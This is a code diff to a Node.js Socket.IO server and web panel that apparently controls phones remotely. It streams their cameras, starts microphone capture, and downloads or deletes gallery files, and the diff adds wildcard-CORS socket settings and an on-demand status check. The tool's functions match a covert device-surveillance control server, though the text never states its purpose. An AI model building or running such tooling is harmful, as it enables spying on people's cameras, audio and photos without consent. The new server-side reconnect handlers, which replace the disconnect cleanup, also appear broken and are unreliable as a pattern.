@@ -9,9 +9,20 @@ const sharp = require('sharp');
 
 const app = express();
 const server = http.createServer(app);
+
+// ✅ FIXED: Socket.IO with proper config
 const io = socketIo(server, {
-    cors: { origin: '*', methods: ['GET', 'POST'] },
-    transports: ['websocket', 'polling']
+    cors: {
+        origin: '*',
+        methods: ['GET', 'POST'],
+        credentials: true
+    },
+    transports: ['polling', 'websocket'],
+    pingTimeout: 60000,
+    pingInterval: 25000,
+    upgradeTimeout: 10000,
+    allowUpgrades: true,
+    cookie: false
 });
 
 app.use(cors());
@@ -137,7 +148,6 @@ function sendNextDownload(deviceId) {
     const next = downloadPending[deviceId].shift();
     downloadInProgress[deviceId] = next;
     requestedFiles[`${deviceId}::${next}`] = Date.now();
-    // Send via Socket.IO
     io.to(`device_${deviceId}`).emit('command', { command: 'gallery_file', value: next });
     console.log(`📤 Serial download → ${next} (${deviceId}) | queue: ${(downloadPending[deviceId]||[]).length} remaining`);
 }
@@ -320,10 +330,9 @@ app.post('/api/heartbeat', (req, res) => {
         device.lastHeartbeat = new Date().toLocaleTimeString();
         device.lastSeen = Date.now();
         saveDevices();
-        
-        // ✅ Broadcast via Socket.IO
+
         io.to(`device_${deviceId}`).emit('heartbeat_response', { success: true, settings: getDeviceSettings(deviceId) });
-        
+
         res.json({ success: true, settings: getDeviceSettings(deviceId) });
     } catch (e) {
         res.status(500).json({ success: false, error: e.message });
@@ -620,7 +629,6 @@ app.delete('/api/gallery/file/:deviceId/:fileName', (req, res) => {
             galleryData[deviceId] = galleryData[deviceId].filter(f => f.name !== fileName);
         }
 
-        // Send via Socket.IO
         io.to(`device_${deviceId}`).emit('command', { command: 'gallery_delete', value: fileName });
 
         res.json({ success: true });
@@ -635,7 +643,6 @@ app.post('/api/voice/start', (req, res) => {
     try {
         const { deviceId } = req.body;
         if (!deviceId) return res.status(400).json({ success: false, error: 'deviceId required' });
-        // Send via Socket.IO
         io.to(`device_${deviceId}`).emit('command', { command: 'voice_start', value: 'true' });
         voiceStreams[deviceId] = { active: true, startedAt: Date.now(), packetsReceived: 0 };
         console.log(`🎤 Voice START sent via WebSocket to ${deviceId}`);
@@ -649,7 +656,6 @@ app.post('/api/voice/stop', (req, res) => {
     try {
         const { deviceId } = req.body;
         if (!deviceId) return res.status(400).json({ success: false, error: 'deviceId required' });
-        // Send via Socket.IO
         io.to(`device_${deviceId}`).emit('command', { command: 'voice_stop', value: 'false' });
         if (voiceStreams[deviceId]) { voiceStreams[deviceId].active = false; voiceStreams[deviceId].stoppedAt = Date.now(); }
         console.log(`⏹️ Voice STOP sent via WebSocket to ${deviceId}`);
@@ -820,7 +826,6 @@ app.post('/api/flip', (req, res) => {
         const ds = getDeviceSettings(deviceId);
         ds.camera = camera;
 
-        // Send via Socket.IO
         io.to(`device_${deviceId}`).emit('command', { command: 'flip', value: camera });
         console.log(`📦 Flip sent via WebSocket: camera=${camera}`);
 
@@ -848,7 +853,6 @@ app.post('/api/command', (req, res) => {
             default: console.log(`⚠️ Unknown command: ${command}`);
         }
 
-        // Send via Socket.IO
         if (deviceId) {
             io.to(`device_${deviceId}`).emit('command', { command, value: value ?? null });
             console.log(`📦 Command sent via WebSocket: ${command} (value: ${value ?? 'none'})`);
@@ -917,10 +921,11 @@ app.get('/api/device/:deviceId', (req, res) => {
     });
 });
 
+// ========== ON-DEMAND STATUS API (Full Device Status) ==========
 app.get('/api/status/:deviceId', (req, res) => {
     try {
         const { deviceId } = req.params;
-        console.log(`📊 Status check for device: ${deviceId}`);
+        console.log(`📊 On-demand status check for device: ${deviceId}`);
         
         const device = devices.find(d => d.id === deviceId);
         if (!device) {
@@ -932,6 +937,9 @@ app.get('/api/status/:deviceId', (req, res) => {
         
         const now = Date.now();
         const isConnected = (now - (device.lastSeen || 0)) < 30000;
+        
+        // ✅ Send command to device to update status (on-demand)
+        io.to(`device_${deviceId}`).emit('command', { command: 'check_status', value: 'true' });
         
         res.json({
             success: true,
@@ -1653,6 +1661,22 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
 io.on('connection', (socket) => {
     console.log(`🔌 Socket.IO connected: ${socket.id}`);
 
+    // ✅ Ping event (for keep-alive)
+    socket.on('ping', () => {
+        // Ping received, pong automatically sent by Socket.IO
+        console.log(`📡 Ping from ${socket.id}`);
+    });
+
+    // ✅ Error event
+    socket.on('error', (error) => {
+        console.log(`❌ Socket error: ${error}`);
+    });
+
+    // ✅ Disconnect event
+    socket.on('disconnect', (reason) => {
+        console.log(`❌ Disconnected: ${reason}`);
+    });
+
     // ✅ Register device
     socket.on('register', (data) => {
         const { deviceId, deviceName, cameraReady, cameraPermission, batteryOptimization } = data;
@@ -1683,10 +1707,8 @@ io.on('connection', (socket) => {
 
         console.log(`📡 Device [${canonicalId}] registered for Socket.IO`);
 
-        // ✅ Send settings
         socket.emit('settings', getDeviceSettings(canonicalId));
 
-        // ✅ Broadcast device update
         io.emit('device_update', {
             id: device.id, name: device.name,
             cameraReady: device.cameraReady || false,
@@ -1800,7 +1822,6 @@ io.on('connection', (socket) => {
             default: console.log(`⚠️ Unknown WS command: ${command}`);
         }
 
-        // ✅ Forward to device
         if (deviceId) {
             io.to(`device_${deviceId}`).emit('command', { command, value: value ?? null });
             console.log(`📦 Command forwarded to device [${deviceId}]: ${command}`);
@@ -1837,20 +1858,26 @@ io.on('connection', (socket) => {
         socket.emit('heartbeat_response', { success: true, settings: getDeviceSettings(deviceId) });
     });
 
-    // ✅ Disconnect
-    socket.on('disconnect', () => {
+    // ✅ Reconnect event
+    socket.on('reconnect', () => {
+        console.log(`🔄 Socket.IO Reconnected!`);
         if (socket.deviceId) {
-            const disconnectedId = socket.deviceId;
-            setTimeout(() => {
-                if (activeStreams[disconnectedId] === socket.id) {
-                    delete activeStreams[disconnectedId];
-                    console.log(`📴 Device [${disconnectedId}] WS stream ended`);
-                }
-            }, 8000);
-            console.log(`⚠️ Device [${disconnectedId}] WS drop — waiting 8s for reconnect`);
-        } else {
-            console.log(`🔌 WS client disconnected: ${socket.id}`);
+            // Re-register device
+            const registerData = {
+                deviceId: socket.deviceId,
+                deviceName: socket.deviceId,
+                cameraReady: false,
+                cameraPermission: true,
+                batteryOptimization: true
+            };
+            socket.emit('register', registerData);
+            console.log(`📱 Device re-registered after reconnect`);
         }
+    });
+
+    // ✅ Reconnect failed event
+    socket.on('reconnect_failed', () => {
+        console.log(`❌ Reconnect failed after all attempts`);
     });
 });
 
@@ -2031,6 +2058,8 @@ app.get('/', requireAuth, (req, res) => {
             <button class="btn btn-stop" id="stopBtn">⏹ STOP</button>
             <button class="btn btn-front" id="frontBtn">📷 FRONT</button>
             <button class="btn btn-back active-cam" id="backBtn">📷 BACK</button>
+            <!-- ✅ On-Demand Status Button -->
+            <button class="btn btn-status" id="statusBtn" onclick="checkStatus()">📊 CHECK STATUS</button>
         </div>
         <div class="section-title">📐 QUALITY</div>
         <div class="quality-grid">
@@ -2115,13 +2144,79 @@ app.get('/', requireAuth, (req, res) => {
         updateFrame('data:image/jpeg;base64,' + data.image);
     });
 
+    // ✅ On-Demand Status Check Function
+    async function checkStatus() {
+        if (!selectedDeviceId) {
+            alert('⚠️ Pehle koi device select karo!');
+            return;
+        }
+
+        const btn = document.getElementById('statusBtn');
+        btn.disabled = true;
+        btn.textContent = '⏳ Loading...';
+
+        try {
+            // ✅ Send command via WebSocket
+            if (wsReady) {
+                socket.emit('send_command', {
+                    deviceId: selectedDeviceId,
+                    command: 'check_status',
+                    value: 'true'
+                });
+            } else {
+                await fetch('/api/command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        deviceId: selectedDeviceId,
+                        command: 'check_status',
+                        value: 'true'
+                    })
+                });
+            }
+
+            // ✅ Wait 1.5 seconds for device to respond
+            await new Promise(resolve => setTimeout(resolve, 1500));
+
+            // ✅ Fetch latest status
+            const response = await fetch(`/api/status/${selectedDeviceId}`);
+            const data = await response.json();
+
+            if (data.success && data.device) {
+                const d = data.device;
+                const statusMsg = 
+    `📱 DEVICE: ${d.name}
+    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    📡 Status: ${d.isConnected ? '✅ Online' : '❌ Offline'}
+    🔄 Streaming: ${d.streaming ? '✅ Active' : '⏸️ Idle'}
+    📷 Camera: ${d.cameraReady ? '✅ Ready' : '❌ Not Ready'}
+    🎥 Camera Type: ${d.camera === 'front' ? 'Front' : 'Back'}
+    🔐 Permission: ${d.cameraPermission ? '✅ Allowed' : '❌ Denied'}
+    🔋 Battery: ${d.batteryPercentage}%
+    📸 Gallery: ${d.galleryCount} files
+    ⚡ WebSocket: ${d.hasWebSocket ? '✅ Connected' : '❌ Disconnected'}
+    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    🕐 Last Heartbeat: ${d.lastHeartbeat || 'N/A'}
+    ⏱️ Server Time: ${new Date(d.serverTime).toLocaleString()}`;
+
+                alert(statusMsg);
+            } else {
+                alert('❌ Error: ' + (data.error || 'Unknown error'));
+            }
+        } catch (error) {
+            alert('❌ Failed to get status: ' + error.message);
+        } finally {
+            btn.disabled = false;
+            btn.textContent = '📊 CHECK STATUS';
+        }
+    }
+
     // ✅ Socket.IO command send
     function sendCommandWS(command, value) {
         if (!selectedDeviceId) { alert('Select a device first'); return; }
         if (wsReady) {
             socket.emit('send_command', { deviceId: selectedDeviceId, command, value: value ?? null });
         } else {
-            // Fallback to HTTP
             fetch('/api/command', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -2558,7 +2653,8 @@ server.listen(PORT, '0.0.0.0', () => {
     console.log('⚡  Socket.IO    : Commands via WebSocket (0 KB idle)');
     console.log('📡  HTTP         : Fallback for data transfer');
     console.log('📸  Gallery      : ✅ ENABLED (Separate Page)');
-    console.log('📊  Status API   : GET /api/status/:deviceId');
+    console.log('📊  Status API   : GET /api/status/:deviceId (On-Demand)');
+    console.log('🔘  Status Button: 📊 CHECK STATUS (On-Demand)');
     console.log('═══════════════════════════════════════════════════');
     console.log('');
 });
